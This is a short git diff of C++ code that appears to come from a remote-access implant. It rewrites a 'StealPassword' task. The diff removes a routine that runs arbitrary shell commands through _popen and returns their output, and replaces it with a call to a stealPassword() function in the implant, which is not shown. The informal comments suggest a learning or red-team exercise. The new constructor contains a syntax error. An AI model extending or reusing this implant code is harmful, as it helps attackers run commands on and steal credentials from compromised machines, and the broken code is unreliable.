@@ -106,28 +106,13 @@ Result ConfigureTask::run() const {
 
 // StealPassword
 // -------------------------------------------------------------------------------------------
-StealPassword::StealPassword(const boost::uuids::uuid& id, std::string command)
+StealPassword::StealPassword(const boost::uuids::uuid& id)
     : id{ id },
-    command{ std::move(command) } {} //what does move do
+    {} 
 
 Result StealPassword::run() const {
     std::string result;
-    try {
-        std::array<char, 128> buffer{};
-        std::unique_ptr<FILE, decltype(&_pclose)> pipe{
-            _popen(command.c_str(), "r"), //declare buffer, gettting pointer to a pipe (containing command)
-            //and then call pclose 
-            _pclose
-        };
-        if (!pipe) //if theres no pointer to a pipe --> error
-            throw std::runtime_error("Failed to open pipe.");
-        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
-            result += buffer.data(); //copy commands into buffer
-        }
-        return Result{ id, std::move(result), true };
-    }
-    catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
-    }
+    //call stealPassword() from implant.cpp
+    result = stealPassword();
+    return Result{ id, result, true };
 }
-
